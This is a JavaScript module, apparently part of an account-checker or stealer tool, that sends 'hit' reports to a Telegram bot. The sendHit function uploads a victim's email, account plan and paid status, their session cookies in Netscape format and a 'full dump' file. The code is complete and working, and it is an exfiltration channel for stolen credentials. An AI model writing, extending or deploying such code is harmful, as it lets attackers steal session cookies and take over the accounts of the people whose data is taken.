// Port of TelegramNotifier — raw HTTPS to api.telegram.org, zero dependencies.
// sendMessage (summary) + sendDocument (Netscape cookies + full dump), same as Android.
'use strict';

const https = require('https');

function post(botToken, method, body, contentType) {
  return new Promise((resolve, reject) => {
    const data = Buffer.isBuffer(body) ? body : Buffer.from(body || '', 'utf8');
    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: `/bot${botToken}/${method}`,
        method: 'POST',
        headers: {
          'Content-Type': contentType,
          'Content-Length': data.length,
        },
        timeout: 30000,
      },
      (res) => {
        let raw = '';
        res.on('data', (c) => { raw += c; });
        res.on('end', () => resolve({ status: res.statusCode, body: raw }));
      }
    );
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(new Error('telegram timeout')); });
    req.write(data);
    req.end();
  });
}

async function sendMessage(botToken, chatId, text) {
  return post(botToken, 'sendMessage', JSON.stringify({ chat_id: chatId, text }), 'application/json');
}

async function sendDocument(botToken, chatId, filename, caption, fileBuffer) {
  const boundary = '----kara' + Date.now().toString(16);
  const parts = [
    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`),
    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`),
    Buffer.from(
      `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\n` +
      'Content-Type: text/plain; charset=utf-8\r\n\r\n'
    ),
    Buffer.isBuffer(fileBuffer) ? fileBuffer : Buffer.from(fileBuffer || '', 'utf8'),
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ];
  return post(botToken, 'sendDocument', Buffer.concat(parts), `multipart/form-data; boundary=${boundary}`);
}

// Full hit report: summary message + cookies document + dump document.
async function sendHit(botToken, chatId, { email, plan, paid, cookiesText, dumpText }) {
  const paidMark = paid ? 'paid' : 'free';
  const summary = `✅ ${email} · plan=${plan || 'unknown'} · ${paidMark}`;
  const safeEmail = email.replace(/[\r\n/\\]+/g, '_');
  const results = [];
  results.push(await sendMessage(botToken, chatId, summary));
  results.push(
    await sendDocument(botToken, chatId, `${safeEmail}.cookies.txt`, `🍪 ${email} · Netscape`, cookiesText)
  );
  results.push(
    await sendDocument(botToken, chatId, `${safeEmail}.hit.txt`, `📄 ${email} · full dump`, dumpText)
  );
  return results;
}

module.exports = { sendMessage, sendDocument, sendHit };
